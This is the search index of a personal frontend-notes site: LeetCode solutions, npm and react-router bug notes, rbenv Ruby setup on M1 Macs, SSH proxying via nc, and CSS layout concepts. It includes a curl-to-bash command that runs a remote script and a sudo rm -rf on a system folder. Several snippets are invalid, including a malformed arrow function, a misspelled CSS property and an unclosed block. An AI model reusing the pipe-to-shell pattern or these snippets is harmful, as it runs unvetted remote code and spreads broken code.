2.\u72b6\u6001\u673a\u7684\u5e94\u7528</p>"},{"location":"algorithm/#_2","title":"\u7f16\u8bd1\u539f\u7406\u5728\u524d\u7aef\u7684\u5e94\u7528","text":"<p>1.\u4eceruntime\u770b\u524d\u7aef 2.babel-plugin-transfrom-react-jsx\u7684\u5b9e\u73b0 3.\u5b9e\u73b0\u4e00\u4e2amini-Vue Compiler 4.\u5b9e\u73b0\u4e00\u4e2amini webpack</p>"},{"location":"algorithm/#_3","title":"\u524d\u7aef\u4e2d\u7684\u4f4d\u8fd0\u7b97","text":"<p>1.\u6e90\u7801\u4e2d\u7684\u4f4d\u8fd0\u7b97 2.React\u4e0eVue\u4e2d\u5e38\u89c1\u7684\u4f4d\u8fd0\u7b97 3.\u6df1\u5ea6\u5a46\u5ab3React Lane\u6a21\u578b</p>"},{"location":"algorithm/#_4","title":"\u524d\u7aef\u4e2d\u7684\u6563\u5217\u8868","text":"<p>1.Map\u4e0eSet\u7684\u6570\u636e\u7ed3\u6784\u5b9e\u73b0 2.Map\u4e0eObject\u7684\u9009\u62e9 3.\u524d\u7aef\u4e2d\u5bf9\u4e8e\u6563\u5217\u8868\u7684\u5b9e\u7528\u573a\u666f</p>"},{"location":"algorithm/#_5","title":"\u4e8b\u4ef6\u5faa\u73af","text":"<p>1.\u4ece\u6570\u636e\u7ed3\u6784\u7684\u89d2\u5ea6\u770b\u4e8b\u4ef6\u5faa\u73af 2.\u8be6\u89e3\u6d4f\u89c8\u5668\u73af\u5883\u4e0bjs\u5f15\u64ce\u7684\u4e8b\u4ef6\u5faa\u73af\u673a\u5236 3.\u8be6\u89e3Node\u73af\u5883\u4e0b\u7684\u4e8b\u4ef6\u5faa\u73af\u673a\u5236</p>"},{"location":"algorithm/#_6","title":"\u524d\u7aef\u52a0\u5bc6\u7b97\u6cd5","text":"<p>1.\u524d\u7aef\u5e38\u89c1\u52a0\u89e3\u51b3\u65b9\u6848\u548c\u539f\u7406 2.\u5b9e\u73b0\u5e38\u89c1\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5982RSA\u7b49</p>"},{"location":"algorithm/#_7","title":"\u7b97\u6cd5\u4e0e\u6570\u636e\u7ed3\u6784","text":"<p>1.\u4e8c\u5206\u3001\u9012\u63a8\u3001\u52a8\u6001\u89c4\u5212\u3001\u6808\u4e0e\u961f\u5217\u3001\u7ebf\u6027\u8868\u3001\u53cc\u6307\u9488\u3001\u4e8c\u53c9\u6811\u3001\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u3001\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u3001\u54c8\u5e0c\u8868\u3001\u5e76\u67e5\u96c6\u3001\u56de\u6eaf</p> <p>BAT\u91cc\u767e\u5ea6\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u963f\u91cc\u7684\u7535\u5546\u670d\u52a1\uff0c\u817e\u8baf\u7684\u793e\u4ea4\u5e94\u7528\uff0c\u662f\u5404\u81ea\u884c\u4e1a\u4e2d\u6beb\u65e0\u4e89\u8bae\u7684\u9f99\u5934\u8001\u5927\u3002\u7136\u800c\uff0c\u79fb\u52a8\u4e92\u8054\u7f51\u65f6\u4ee3\u4ea7\u751f\u7684\u65b0\u8d35TMD\u7ec4\u5408\uff08\u5934\u6761\u3001\u7f8e\u56e2\u3001\u6ef4\u6ef4\uff09\uff0c\u77ed\u77ed\u51e0\u5e74\u4f9d\u9760\u7740\u8fd9\u4e92\u8054\u7f51\u7528\u6237\u7684\u7ea2\u5229\uff0c\u5206\u522b\u5728\u5185\u5bb9\u9886\u57df\u3001\u6d88\u8d39\u9886\u57df\u548c\u4ea4\u901a\u9886\u57df\u5f00\u8f9f\u4e86\u4e00\u7247\u5929\uff0c\u5728\u4e92\u8054\u7f51\u7684\u7b2c\u4e8c\u6ce2\u6d6a\u6f6e\u4e2d\u6210\u4e3a\u4e2d\u6d41\u7825\u67f1\uff0c\u88ab\u89c6\u4e3a\u76ee\u524d\u5bf9 BAT\u5e26\u6765\u6700\u5927\u51b2\u51fb\u7684\u6311\u6218\u8005\u3002\u4f9d\u9760\u4eba\u4eba\u90fd\u4e0d\u770b\u597d\u7684\u63a8\u8350\u7b97\u6cd5\u8d77\u5bb6\uff0c\u4eca\u65e5\u5934\u6761\u901a\u8fc7\u667a\u80fd\u624b\u673a\u7cbe\u51c6\u5730\u5c06\u5185\u5bb9\u5339\u914d\u7ed9\u7528\u6237\uff0c\u4ee5\u4e00\u5df1\u4e4b\u529b\u63a8\u52a8\u4e86\u4f20\u64ad\u65b9\u5f0f\u7684\u8f6c\u578b\u3002\u518d\u52a0\u4e0a\u540c\u516c\u53f8\u63a8\u51fa\u7684\u6296\u97f3\u3001\u706b\u5c71\u5c0f\u89c6\u9891\u7b49\u4ea7\u54c1\uff0c\u5bf9\u4e0a\u4e86\u4eba\u4eec\u6c72\u53d6\u4fe1\u606f\u548c\u5a31\u4e50\u81ea\u8eab\u7684\u80c3\u53e3\uff0c\u5982\u4eca\u5df2\u7ecf\u6df1\u6df1\u624e\u6839\u5728\u4e86\u4e2d\u56fd\u7684\u5e7f\u544a\u5e02\u573a\u548c\u5185\u5bb9\u9886\u57df\u3002\u540c\u65f6\uff0c\u7f8e\u56e2\u548c\u6ef4\u6ef4\u5728\u5404\u81ea\u7684\u6d88\u8d39\u9886\u57df\u548c\u4ea4\u901a\u9886\u57df\u5927\u5c55\u8eab\u624b\uff0c\u4e1a\u52a1\u6838\u5fc3\u7740\u91cd\u4e8e\u4eba\u4eec\u7684\u8863\u98df\u4f4f\u884c</p>"},{"location":"algorithm/add-two-nums/","title":"Add two nums","text":""},{"location":"algorithm/add-two-nums/#_1","title":"\u57fa\u7840\u89e3","text":"<ol> <li> <p>\u904d\u5386\u4e24\u4e2a\u94fe\u8868\u5c06\u5b83\u4eec\u5206\u522b\u8f6c\u5316\u6210\u6574\u6570 2.\u5bf9\u4e24\u4e2a\u6574\u6570\u6c42\u548c 3.\u5c06\u548c\u518d\u8f6c\u6362\u6210\u94fe\u8868</p> </li> <li> <p>fail case: \u8d8a\u754c</p> </li> </ol> <pre><code>/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n/**\n * @param {ListNode} l1\n * @param {ListNode} l2\n * @return {ListNode}\n */\nvar addTwoNumbers = function(l1, l2) {\n    let digit = 0, // 0\u8868\u793a\u5404\u4f4d\uff0c1\u8868\u793a\u5341\u4f4d\n        n1 =  0 // \u94fe\u8868\u5bf9\u5e94\u7684\u6574\u6570\n\n    while(l1 !== null){\n        const pow = Math.pow(10, digit)\n        n1 += l1.val * pow\n        l1 = l1.next // \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u8282\u70b9\n        digit++ // \u4f4d\u6570\u52a0+\n    }\n\n    digit = 0 // \u91cd\u7f6e\u4f4d\u6570\n    let n2 =  0\n     while(l2 !== null){\n        const pow = Math.pow(10, digit)\n        n2 += l2.val * pow\n        l2 = l2.next // \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u8282\u70b9\n        digit++ // \u4f4d\u6570\u52a0+\n    }\n    let sum = n1 + n2\n    const head = new ListNode()\n    let curr = head\n    if (sum === 0) {\n        head.next = new ListNode(0)\n        return head.next\n    }\n    while(sum &gt; 0) {\n        const val = sum % 10 // \u6bcf\u6b21\u53d6\u51fa\u5f53\u524d\u6700\u4f4e\u4f4d\n        curr.next = new ListNode(val) // \u521b\u5efa\u65b0\u8282\u70b9\uff0c\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        curr = curr.next // \u94fe\u8868\u5c3e\u6307\u9488\u79fb\u52a8\n        sum = Math.floor(sum / 10)\n    }\n    return head.next\n };\n</code></pre>"},{"location":"algorithm/add-two-nums/#_2","title":"\u66f4\u4f18\u89e3","text":"<p>leetcode 67 371 445 989</p>"},{"location":"algorithm/remove-outermost-parentheses/","title":"Remove outermost parentheses","text":""},{"location":"algorithm/remove-outermost-parentheses/#_1","title":"\u89e3\u6cd5\u4e00","text":""},{"location":"algorithm/remove-outermost-parentheses/#_2","title":"\u89e3\u6cd5\u4e8c","text":"<ol> <li>\u8bc6\u522b left = right, stack.isempty()</li> <li>\u622a\u53d6 slice(startIdx, lastIdx)</li> <li>\u5408\u5e76 merge(concat)</li> </ol>"},{"location":"algorithm/timsort/","title":"Timsort","text":"<p><code>index.spec.js</code></p> <pre><code>reverseReange(workArr, start, start + runLength)\n</code></pre> <pre><code>const reverseReange = (arr, from, to) =&gt; {\n  while (from &lt; to) {\n    const startElem = arr[from]\n    const endElem = arr[to]\n    arr[from++] = endElem\n    arr[to--] = startElem\n  }\n}\n</code></pre>"},{"location":"bugs/","title":"Index","text":"<pre><code>node --trace-deprecation\nWelcome to Node.js v21.6.2.\nType \".help\" for more information.\n&gt; punycode\n{\n  version: '2.1.0',\n  ucs2: { decode: [Function: ucs2decode], encode: [Function: ucs2encode] },\n  decode: [Function: decode],\n  encode: [Function: encode],\n  toASCII: [Function: toASCII],\n  toUnicode: [Function: toUnicode]\n}\n</code></pre> <p>I have MBP M1 Pro. I saw @rudyjdr answer and I modified it a bit.</p> <p>in regular terminal: <code>sudo arch -x86_64 gem install ffi</code> then in the project root <code>cd ios &amp;&amp; arch -x86_64 pod install &amp;&amp; cd ../</code></p> <p>I also had to delete Flipper lines in <code>ios/Podfile</code> to get the app running. (But that's probably not related to your problem)</p> <p>An Tran</p> <p></p> <p></p>"},{"location":"bugs/#how-to-install-the-latest-ruby-version-on-m1m1-prom1-max-macs-m1m1-prom1-max-macruby","title":"How to install the latest ruby version on M1/M1 Pro/M1 Max Macs? \u5982\u4f55\u5728M1/M1 Pro/M1 Max Mac\u4e0a\u5b89\u88c5\u6700\u65b0\u7684ruby\u7248\u672c\uff1f","text":"<p>December 08, 2021 \u2022 2 min read \u2022 #iOS, #Swift, #MacBook, #M1, #tool, #ruby 2021 \u5e74 12 \u6708 8 \u65e5 \u2022 \u9605\u8bfb 2 \u5206\u949f \u2022 #iOS\u3001#Swift\u3001#MacBook\u3001#M1\u3001#tool\u3001#ruby</p> <p>Ruby, for some reasons, has become an essential part of iOS Development tool belt. With popular tools written in Ruby such as cocoapods or fastlane, installing Ruby is one of the first task most iOS developers do when setting up a new development environment. \u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0cRuby \u5df2\u7ecf\u6210\u4e3a iOS \u5f00\u53d1\u5de5\u5177\u5e26\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u5bf9\u4e8e\u7528 Ruby \u7f16\u5199\u7684\u6d41\u884c\u5de5\u5177\uff08\u4f8b\u5982 cocoapods \u6216 fastlane\uff09\uff0c\u5b89\u88c5 Ruby \u662f\u5927\u591a\u6570 iOS \u5f00\u53d1\u4eba\u5458\u5728\u8bbe\u7f6e\u65b0\u7684\u5f00\u53d1\u73af\u5883\u65f6\u8981\u505a\u7684\u9996\u8981\u4efb\u52a1\u4e4b\u4e00\u3002</p> <p>Unfortunately, the preinstalled version of Ruby on Macs is outdated. For my new Macbook Pro 14 Inch (Dec 2021), the preinstalled Ruby is at version <code>2.6.8p205</code> . And the latest stable version of Ruby is <code>3.0.3</code> \u4e0d\u5e78\u7684\u662f\uff0cMac \u4e0a\u9884\u88c5\u7684 Ruby \u7248\u672c\u5df2\u7ecf\u8fc7\u65f6\u4e86\u3002\u5bf9\u4e8e\u6211\u7684\u65b0 Macbook Pro 14 \u82f1\u5bf8\uff082021 \u5e74 12 \u6708\uff09\uff0c\u9884\u88c5\u7684 Ruby \u7248\u672c\u4e3a <code>2.6.8p205</code> \u3002 Ruby \u7684\u6700\u65b0\u7a33\u5b9a\u7248\u672c\u662f <code>3.0.3</code></p> <p>In this article, I\u2019ll show you some easy steps to install the latest Ruby version on your new MacBooks. \u5728\u672c\u6587\u4e2d\uff0c\u6211\u5c06\u5411\u60a8\u5c55\u793a\u5728\u65b0 MacBook \u4e0a\u5b89\u88c5\u6700\u65b0 Ruby \u7248\u672c\u7684\u4e00\u4e9b\u7b80\u5355\u6b65\u9aa4\u3002</p> <p>We are going to use rbenv to seamleassly manange the Ruby environment. \u6211\u4eec\u5c06\u4f7f\u7528 rbenv \u6765\u65e0\u7f1d\u7ba1\u7406 Ruby \u73af\u5883\u3002</p>"},{"location":"bugs/#install-rbenv-rbenv","title":"Install rbenv \u5b89\u88c5rbenv","text":"<pre><code># Install rbenv\nbrew install rbenv\n\n# Initialise rbenv\nrbenv init\n</code></pre>"},{"location":"bugs/#verify-rbenv-rbenv","title":"Verify rbenv \u9a8c\u8bc1 rbenv","text":"<pre><code>\u279c  ~ curl -fsSL https://github.com/rbenv/rbenv-installer/raw/main/bin/rbenv-doctor | bash\n\nChecking for `rbenv' in PATH: /opt/homebrew/bin/rbenv\nChecking for rbenv shims in PATH: OK\nChecking `rbenv install' support: /opt/homebrew/bin/rbenv-install (ruby-build 20211203)\nCounting installed Ruby versions: none\n  There aren't any Ruby versions installed under `/Users/antran/.rbenv/versions'.\n  You can install Ruby versions like so: rbenv install 3.0.3\nChecking RubyGems settings: OK\nAuditing installed plugins: OK\n</code></pre>"},{"location":"bugs/#install-ruby","title":"Install ruby \u5b89\u88c5\u7ea2\u5b9d\u77f3","text":"<p>List latest stable versions: \u5217\u51fa\u6700\u65b0\u7684\u7a33\u5b9a\u7248\u672c\uff1a</p> <pre><code>\u279c  ~ rbenv install -l\n2.6.9\n2.7.5\n3.0.3\njruby-9.3.2.0\nmruby-3.0.0\nrbx-5.0\ntruffleruby-21.3.0\ntruffleruby+graalvm-21.3.0\n</code></pre> <p>Install Ruby 3.0.3 \u5b89\u88c5\u7ea2\u5b9d\u77f33.0.3</p> <pre><code>\u279c  ~ rbenv install 3.0.3\nDownloading openssl-1.1.1l.tar.gz...\n-&gt; https://dqw8nmjcqpjn7.cloudfront.net/0b7a3e5e59c34827fe0c3a74b7ec8baef302b98fa80088d7f9153aa16fa76bd1\nInstalling openssl-1.1.1l...\nInstalled openssl-1.1.1l to /Users/antran/.rbenv/versions/3.0.3\n\nDownloading ruby-3.0.3.tar.gz...\n-&gt; https://cache.ruby-lang.org/pub/ruby/3.0/ruby-3.0.3.tar.gz\nInstalling ruby-3.0.3...\nruby-build: using readline from homebrew\nInstalled ruby-3.0.3 to /Users/antran/.rbenv/versions/3.0.3\n</code></pre> <p>Set global version \u8bbe\u7f6e\u5168\u5c40\u7248\u672c</p> <pre><code> rbenv global 3.0.3\n</code></pre> <p>Verify \u6838\u5b9e</p> <pre><code>\u279c  ~ ruby -v\nruby 3.0.3p157 (2021-11-24 revision 3fb7d2cadc) [arm64-darwin21]\n</code></pre> <ul> <li> Lingering update files taking up a lot of space</li> </ul> <pre><code>sudo rm -rf /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate\n</code></pre>"},{"location":"bugs/npm/","title":"Npm","text":"<p>Run <code>npm bin --global</code> to find out where npm installs global executables. Add that path to your <code>PATH</code> environment variable, by adding a line in your <code>.profile</code>/<code>.bash_profile</code>/<code>.zprofile</code> or similar, depending on which shell you use (you can find out what is your default shell using <code>echo $SHELL</code>).</p> <ul> <li> npm \u7f13\u5b58\u65e7\u7248package.json</li> </ul> <p>\u5728<code>package.json</code>\u4e2d\u660e\u660e\u6709inspec\u811a\u672c <pre><code>\"scripts\": {\n  \"start\": \"nodemon index.js\",\n  \"inspect\": \"NODE_INSPECT_RESUME_ON_START=1 node inspect index.js\"\n},\n</code></pre> \u4f46<code>npm run</code>\u663e\u793a\u6ca1\u6709 <pre><code>\u279c  server git:(master) \u2717 npm run\nLifecycle scripts included in server@1.0.0:\n  start\n    nodemon index.js\n\u279c  server git:(master) \u2717 npm cache clean --force\nnpm warn using --force Recommended protections disabled.\n\u279c  server git:(master) \u2717 npm run\nLifecycle scripts included in server@1.0.0:\n    start\n    nodemon index.js\navailable via `npm run-script`:\n    inspect\n    NODE_INSPECT_RESUME_ON_START=1 node inspect index.js\n</code></pre></p>"},{"location":"bugs/react-router-dom/","title":"react-router-dom useNavigate","text":"relative current route when navigate <p>Product:    react-router-dom \u25be</p> <p>Component:  useNavigate Hook \u25be</p> <p>Version:    \"react-router-dom\": \"^6.23.1\",</p> <p>Platform:   Desktop Macos</p> <p>\u5f53\u524d\u641c\u7d22\u9875\u7684url <code>http://localhost:3000/searchList/201235/\u9e21\u8089</code></p> <p>\u89e6\u53d1\u9875\u9762\u8df3\u8f6c\u7684 tag <pre><code>&lt;li\n  className=\"list-item\"\n  key={item + index}\n  onClick={() =&gt; handleKeywordClick(item)}\n&gt;\n  {item}\n&lt;/li&gt;\n</code></pre> \u7bad\u5934\u51fd\u6570\u8df3\u8f6c\u7ed3\u679c <code>http://localhost:3000/search/201235/searchList/201235/\u9e21\u8089</code> <pre><code>const handleKeywordClick(keyword) =&gt; {\n    navigate(`/searchList/${params.shopId}/${keyword}`);\n  }\n</code></pre></p> <p>\u51fd\u6570\u58f0\u660e\u8df3\u8f6c\u7ed3\u679c <code>http://localhost:3000/searchList/201235/\u9e21\u8089</code> <pre><code>function handleKeywordClick(keyword) {\n  navigate(`/searchList/${params.shopId}/${keyword}`)\n}\n</code></pre></p>"},{"location":"bugs/ssh/","title":"Bug report Guide","text":"desc <p>Product:    react-router-dom \u25be</p> <p>Component:  useNavigate Hook \u25be</p> <p>Version:    \"react-router-dom\": \"^6.23.1\",</p> <p>Platform:   Desktop Macos</p> <ul> <li> add the public key to the authorized_keys</li> </ul> <pre><code>\u279c  .ssh nvim /etc/ssh/sshd_config\n\u279c  .ssh chmod 700 ~/.ssh\n\u279c  .ssh touch ~/.ssh/authorized_keys\n\u279c  .ssh chmod 600 ~/.ssh/authorized_keys\n\u279c  .ssh cat id_ed25519.pub &gt;&gt; authorized_keys \n\u279c  .ssh pwd\n/Users/ayao/.ssh\n</code></pre> <ul> <li> proxy cofig for terminal</li> </ul> <pre><code>\u279c env | grep proxy\nhttps_proxy=http://127.0.0.1:6152\nhttp_proxy=http://127.0.0.1:6152\nall_proxy=socks5://127.0.0.1:6153\n\u279c nvim ~/.zshrc      \n\u279c source ~/.zshrc\n</code></pre> <ul> <li> remote access through proxy</li> </ul> <pre><code>nvim ~/.ssh/config\n\nProxyCommand /usr/bin/nc -X connect -x 127.0.0.1:6152 %h %p\n\nssh -o ProxyCommand=\"nc -X 5 -x 127.0.0.1:1086 %h %p\" &lt;remote_user&gt;@&lt;remote_ip&gt;\n</code></pre> <p>\u89e3\u91ca\uff1a \u2013 <code>-o</code>\uff1aoption\uff0c\u8868\u793a\u9009\u9879\u7684\u610f\u601d\uff1b \u2013 <code>ProxyCommand</code>\uff1assh\u7684\u4e00\u4e2a\u9009\u9879\uff0c<code>man ssh</code>\u7684<code>-o</code>\u9009\u9879\u4e2d\u53ef\u770b\u5230\u6709ssh\u6709\u54ea\u4e9b\u9009\u9879\u53ef\u4f7f\u7528\uff0c\u8981\u8fdb\u4e00\u6b65\u770b\u9009\u9879\u5177\u4f53\u542b\u4e49\uff0c\u53ef\u7528<code>man ssh_config</code>\u67e5\u770b\uff1b \u2013 <code>nc</code>:netcat\uff0cnet\u5c31\u662f\u7f51\u7edc\uff0ccat\u5c31\u662f\u201cconcatenate\u201d(\u8fde\u63a5)\uff0c\u5c31\u662f\u8fde\u63a5\u7f51\u7edc\u7684\u610f\u601d\uff0c\u8fd9\u662f\u4e00\u4e2a\u5de5\u5177\uff0c\u53ef\u4ee5\u7528<code>man nc</code>\u67e5\u770b\uff0cwindows\u4e0b\u5e94\u8be5\u4e0d\u5b58\u5728\u8fd9\u4e2a\u547d\u4ee4\uff0clinux\u4e5f\u9700\u8981\u5b89\u88c5\uff0cmac\u81ea\u5e26\u8fd9\u4e2a\u547d\u4ee4\uff1b \u2013 <code>-X</code>: (\u5927\u5199X)\u6307\u5b9a\u4ee3\u7406\u534f\u8bae\uff0c\u6709\u4e09\u79cd\u503c\uff1a \u00a0\u00a0\u00a0\u00a0 4\uff1aSOCKS v4 \u00a0\u00a0\u00a0\u00a0 5\uff1aSOCKS v5 \u00a0\u00a0\u00a0\u00a0 connect\uff1aHTTPS \u2013 <code>-x</code>\uff1a(\u5c0f\u5199x)\u6307\u5b9a\u4ee3\u7406\u7684\u4e3b\u673a\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6211\u4f8b\u5b50\u91cc\u5199<code>127.0.0.1:1086</code>\uff0c\u662f\u56e0\u4e3a\u6211\u7528\u7684ss\uff0c\u5b83\u6709\u5b83\u7684\u672c\u5730ip\u548c\u7aef\u53e3\uff0c\u5f53\u7136\u4e3b\u673a\u5730\u5740\u4e5f\u53ef\u4ee5\u586b\u57df\u540d\uff1b \u2013 <code>%h %p</code>\uff1a\u53d8\u91cf\uff0c\u7528\u4e8e\u66ff\u6362ssh\u771f\u6b63\u8981\u8fde\u63a5\u7684\u670d\u52a1\u5668\u7684\u4e3b\u673a\u540d(host)\u548c\u7aef\u53e3(port)\uff1b \u2013 <code>root@101.121.218.234</code>\uff1a\u771f\u6b63\u8981\u8fde\u63a5\u7684\u4e3b\u673a\u3002</p> <ul> <li> update credentials from the macos keychain</li> </ul> <p>You'll need to update your saved credentials in the <code>git-credential-osxkeychain</code> helper if you change your username, password, or personal access token on GitHub</p> <ol> <li>Click on the Spotlight icon (magnifying glass) on the right side of the menu bar.</li> <li>Type <code>Keychain Access</code>, then press the Enter key to launch the app.</li> <li>In Keychain Access, search for <code>github.com</code>.</li> <li>Find the \"Internet password\" entry for <code>github.com</code>.</li> <li>Edit or delete the entry accordingly.</li> </ol>"},{"location":"css/","title":"Index","text":"<ul> <li>BFC</li> <li>IFC</li> <li>FFC</li> <li>GFC</li> </ul>"},{"location":"css/#bfc","title":"BFC","text":"<p>Block Foramtting Context  </p> <p>\u5bb9\u5668\u91cc\u9762\u7684\u5b50\u5143\u7d20\u4e0d\u4f1a\u5728\u5e03\u5c40\u4e0a\u5f71\u54cd\u5230\u5916\u90e8\u5143\u7d20</p>"},{"location":"css/#bfc_1","title":"\u89e6\u53d1BFC\u7684\u6761\u4ef6","text":"<p>float \u4e0d\u4e3anone</p> <p>overflow\u4e0d\u4e3avisible</p> <p>postion\u4e0d\u4e3arelative\u548cstatic</p> <p>display \u4e3a table-cell, table-caption, inline-block\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u3002</p>"},{"location":"css/#ifc","title":"IFC","text":"<p>\u6c34\u5e73\u65b9\u5411\u7684(margin, padding,border)\u4f1a\u8ba1\u7b97\uff0c\u5782\u76f4\u65b9\u5411\u4e0d\u4f1a</p> <p>\u5728\u5782\u76f4\u65b9\u5411\u901a\u8fc7<code>vertical align</code>\u7edf\u4e00\u5bb9\u5668\u4e2ditem\u5bf9\u9f50\u65b9\u5f0f\uff08baseline,top,middle)</p> <pre><code>.icon {\n  height: 100px;\n}\ni {\n  vertical-algin: center;\n  line-height: 100px\n}\nspan {\n  \n}\n</code></pre> <p><code>line-box</code>\u9ad8\u5ea6\u7531\u884c\u9ad8\u8ba1\u7b97</p>"},{"location":"css/#ifc_1","title":"IFC\u7528\u5904","text":"<p>\u90a3\u4e48IFC\u4e00\u822c\u6709\u4ec0\u4e48\u7528\u5462\uff1f  \u6c34\u5e73\u5c45\u4e2d\uff1a\u5f53\u4e00\u4e2a\u5757\u8981\u5728\u73af\u5883\u4e2d\u6c34\u5e73\u5c45\u4e2d\u65f6\uff0c\u8bbe\u7f6e\u5176\u4e3ainline-block\u5219\u4f1a\u5728\u5916\u5c42\u4ea7\u751fIFC\uff0c\u901a\u8fc7text-align\u5219\u53ef\u4ee5\u4f7f\u5176\u6c34\u5e73\u5c45\u4e2d\u3002  \u5782\u76f4\u5c45\u4e2d\uff1a\u521b\u5efa\u4e00\u4e2aIFC\uff0c\u7528\u5176\u4e2d\u4e00\u4e2a\u5143\u7d20\u6491\u5f00\u7236\u5143\u7d20\u7684\u9ad8\u5ea6\uff0c\u7136\u540e\u8bbe\u7f6e\u5176vertical-align:middle\uff0c\u5176\u4ed6\u884c\u5185\u5143\u7d20\u5219\u53ef\u4ee5\u5728\u6b64\u7236\u5143\u7d20\u4e0b\u5782\u76f4\u5c45\u4e2d\u3002</p>"},{"location":"css/#container-query","title":"Container query","text":""},{"location":"css/#desktop-layout","title":"Desktop layout","text":""},{"location":"css/#desktop-layout-analysis","title":"Desktop Layout analysis","text":"<p>We can divide this into two grids: a 4-column grid on the left, and a single column on the right (the sidebar).</p> <p>On the left, we have a large featured article spanning four columns. Below this, two articles span two columns each. These have a horizontal layout, with the images on the left and text on the right. Below that are four smaller articles, each spanning a single column, they have a vertical layout,  the images are stacked above the tex</p> <p></p>"},{"location":"css/#mobile-layout","title":"Mobile Layout","text":""},{"location":"css/#respond-to-the-available-space","title":"respond to the available space.","text":"<pre><code>&lt;ul class=\"grid\"&gt;\n  &lt;li class=\"article-container\"&gt;\n    &lt;article&gt;...&lt;/article&gt;\n  &lt;/li&gt;\n  &lt;li class=\"article-container\"&gt;\n    &lt;article&gt;...&lt;/article&gt;\n  &lt;/li&gt;\n  &lt;li class=\"article-container\"&gt;\n    &lt;article&gt;...&lt;/article&gt;\n  &lt;/li&gt;\n  ...\n&lt;/ul&gt;\n</code></pre> <pre><code>.article-container {\n  container-name: article;\n  container-type: inline-size;\n}\n\narticle {\n  display: grid;\n  gap: 1rem;\n}\n/*\n    .article-container {\n  container: article / inline-size;\n}\n*/\n\n\n@container article (inline-size &gt; 500px) {\n  /* Styles for horizontal article */\n  article {\n    grid-template-columns: 1fr 2fr;\n  }\n}\n\n@container article (inline-size &gt; 800px) {\n  article {\n    /* Styles for article in a large space (e.g. featured article) */\n    grid-template-columns: 1fr 1fr;\n    gap: 2rem;\n    font-size: 1.2rem;\n  }\n\n  h3 {\n    font-size: 2rem;\n  }\n}\n</code></pre> <pre><code>/* Old syntax for styles between 700px and 900px */\n@container (min-width: 700px) and (max-width: 900px) {\n}\n\n/* New syntax */\n@container (700px &lt;= width &lt;= 900px) {\n}\n</code></pre> <pre><code>&lt;div class=\"grid-container\"&gt;\n  &lt;ul class=\"grid\"&gt;\n    &lt;li class=\"article-container\"&gt;...&lt;/li&gt;\n    &lt;li class=\"article-container\"&gt;...&lt;/li&gt;\n    &lt;li class=\"article-container\"&gt;...&lt;/li&gt;\n    ...\n  &lt;/ul&gt;\n&lt;/div&gt;\n</code></pre> <pre><code>.grid-container {\n  container: layout / inline-size;\n}\n.grid {\n  display: grid;\n  gap: 1rem;\n}\n\n/* Initial styles for single column layout */\n.grid {\n  display: grid;\n  gap: 1rem;\n}\n\n@container layout (inline-size &gt; 800px) {\n  .grid {\n    grid-template-columns: repeat(2, 1fr);\n  }\n\n  /* The featured article should span two columns */\n  .article-container:first-child {\n    grid-column: span 2;\n  }\n}\n\n@container layout (inline-size &gt; 1000px) {\n  .grid {\n    grid-template-columns: repeat(4, 1fr);\n  }\n\n  .article-container:first-child {\n    grid-column: span 4;\n  }\n\n  .article-container:nth-child(2),\n  .article-container:nth-child(3) {\n    grid-column: span 2;\n  }\n</code></pre>"},{"location":"css/#do-we-still-need-media-queies","title":"Do we still need media queies?","text":"<p><code>prefers-reduced-motion</code></p> <p><code>prefers-color-scheme</code></p> <ol> <li> <p>media queries \u21a9</p> </li> </ol>"},{"location":"css/concepts/","title":"Concepts","text":"<p>intrinsic and extrinsic sizing</p>"},{"location":"css/image-solution/","title":"images solution","text":""},{"location":"css/image-solution/#img-and-object-position-and-object-fit","title":"img and object-position and object-fit","text":"<p>you have an image that needs to fit its content box without losing the aspect</p> <p>via CSS background-image and give it the background-size: cover property.  <pre><code>background-size: cover\nbackground-image\n</code></pre></p> <p>inline images and style them in CSS with object-fit and object-position instead.</p>"},{"location":"css/image-solution/#css-spirtes","title":"css spirtes","text":"<p>Etymology  The idea was that the computer could fetch a graphic into memory, and then only display parts of that image at a time, which was faster than having to continually fetch new images. The sprite was the big combined graphi</p> <p>get the image once, and shift it around and only display parts of it. This reduces the overhead of having to fetch multiple images.</p>"},{"location":"css/image-solution/#data-uris","title":"Data URIs","text":""},{"location":"css/image-solution/#icon-fonts","title":"Icon Fonts","text":""},{"location":"css/image-solution/#inline-svg","title":"inline-svg","text":""},{"location":"css/layout-mode/","title":"layout mode","text":""},{"location":"css/sizing-layout/","title":"css sizing layout","text":"<p>sizing layout in smashing magazine</p>"},{"location":"css/sizing-layout/#data-type","title":"data-type","text":"<ul> <li>font relative length unit em rem ch ex </li> <li>viewport relative length unit vw vh vmin vmax</li> <li>absolute units cm mm Q in pc pt px</li> <li>percentages</li> </ul> <p>intrinsic and extrinsic sizing content-based \"intrinsic\" sizes context-based \"extrinsic\" sizes</p> <p>CSS Intrinsic and Extrinsic Sizing Module</p> <p>\"This module extends the CSS sizing properties with keywords that represent content-based \"intrinsic\" sizes and context-based \"extrinsic\" sizes, allowing CSS to more easily describe boxes that fit their content or fit into a particular layout context.\"</p> <p>manage situations where there is more space than needed to display items, or items need to fit into less space than they would take up if space was infinite.</p> <p>Grid Layout track sizing flex-basis sizing</p> <p>leftover space in the grid container.</p> <p>Content-Based Sizing max-content min-content fit-content() Auto-Sized auto in flex basis <p>div - hitting the edges of the containing block of edge</p> <p>A div is a block level element, and so, if you don\u2019t give it a width, it will stretch out to be as wide in the inline dimension as it can Either until it reaches the edge of the viewport or the containing block. If a string of text is longer than the space allowed, it will wrap inside the div, and the box will become taller to accommodate it</p> <p>minmax css function</p> <p></p> <ul> <li>offsetHeight </li> </ul> <p>Height occupied by the element on document</p> <ul> <li> <p>clientHeight: only <code>VISIBLE content &amp; padding</code> CSS height + CSS padding - height of horizontal scrollbar</p> </li> <li> <p>scollHeihgt <code>ENTIRE  content &amp; padding (visible or not)</code> Height of all 